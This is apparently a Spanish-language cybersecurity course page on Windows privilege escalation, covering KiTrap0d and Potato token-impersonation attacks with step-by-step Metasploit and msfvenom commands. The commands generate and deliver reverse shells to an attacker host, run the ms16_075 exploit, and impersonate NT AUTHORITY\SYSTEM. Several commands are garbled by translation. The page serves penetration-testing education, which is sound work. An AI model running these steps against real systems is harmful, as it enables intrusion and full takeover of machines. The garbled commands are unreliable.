## **Explotaciones del kernel**

Un Kernel es el componente central del sistema operativo y actúa como un puente entre los componentes de hardware y las aplicaciones de software.

Cuando un sistema operativo se carga en la memoria, el kernel se carga primero y permanece en la memoria hasta que el sistema operativo se apaga nuevamente.

El kernel es responsable de tareas de bajo nivel, como la administración de discos, la administración de tareas y la administración de memoria.

Inicialmente, estos exploits se facilitan una vez que logramos establecernos en nuestro sistema de destino, por lo que después de obtener acceso a través de metasploit (preferiblemente), ejecute esto /post/multi/recon/local_exploit_suggestery verifique si Kitrap0d existe.

### **Explotación Kitrap0d**

Inicialmente crearemos un shell inverso y lo cargaremos en el sistema de destino `msfvenom -p windows/shell_reverse_tcp LHOST=yourIP LPORT=555 -f aspx > myfile.aspx`

> -p = carga útil (aquí un shell inverso simple)
> 
> 
> LHOST = dirección IP actual del sistema
> 
> LPORT = puerto de su elección
> 
> -f = tipo de archivo (a qué tipo de archivo va el sistema para trabajar)
> 
> > = guardar el archivo de salida con un nombre de archivo

de alguna manera cargue este archivo en el sistema de destino. Aquí usamos ftp como ejemplo para cargarftp 10.0.0.1

password is anonymous and then type "put manual.aspx nc -nvlp 555

Vaya a la dirección IP/sitio e invoque la carga útil.

### Potato Attacks

Supongamos que tenemos un shell en la máquina con Windows y después de verificar whoami /priv descubrimos que tenemos privilegios de token de suplantación.

![NoSQL23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL23.png?raw=true)

Lo que nos ayuda a obtener NT/Autoridad mediante un ataque de papa, entonces se puede hacer lo siguiente:

habrá dos instancias en este punto

> La primera instancia es que debemos tener un pie en el sistema y verificar si el sistema tiene algún privilegio de identidad (figura anterior).
> 
> 
> Es el shell de Metasploit que estamos a punto de trazar.

### En Metasploit:

> usar/exploit/multi/script/web_delivery
> 
> 
> establecer el objetivo como PSH (PowerShell)
> 
> establecer la carga útil comowindows/meterpreter/reverse_tcp

configure LHOST y SRVHOST como su dirección IP.

Ingrese a ejecutar, obtendremos una carga útil, la copiaremos y la pegaremos en la primera instancia donde esté presente el caparazón de apoyo inicial (1.)

![NoSQL24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL24.png?raw=true)

Pegue el comando anterior en primera instancia.

Después de pegar, ingrese session1 y escriba getprivs

compruebe si es arquitectura x64 o x86 escribiendogetuid

Ejecute `post/multi/recon/local_exploit_suggestery` verifique todos los exploits disponibles que se pueden aprovechar.

`correrwindows/local/ms16_075_reflection`

establecer sesión en 1

establezca LHOST en la ip de kali

configure LPORT en cualquier puerto en el que la sesión 1 no esté escuchando

establecer la carga útil `enwindows/x64/meterpreter/reverse_tcp`

correr

load incognito

![NoSQL25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL25.png?raw=true)

escriba list_tokens -uy observe **NT AUTHORITY\SYSTEM**

tipoimpersonate_token "NT Authority\SYSTEM"

escriba shellahora somos como Autoridad

En el caso de Labs y boxes, puede haber alguna situación de flujo de datos que se utiliza para ocultar la información de un archivo. En esos casos, podemos usar este blog: [https://blog.malwarebytes.com/101/2015/07/introduction-to -flujos-de-datos-alternativos/](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)

frases simples podrían ser **dir /R** (para búsqueda recursiva de archivos en el directorio) **más <nombre del archivo que se desea buscar**

### **Referencias:**

> SecWiki/exploits-del-kernel-de-windows: exploits-del-kernel-de-windows Windows平台提权漏洞集合 (github.com)
> 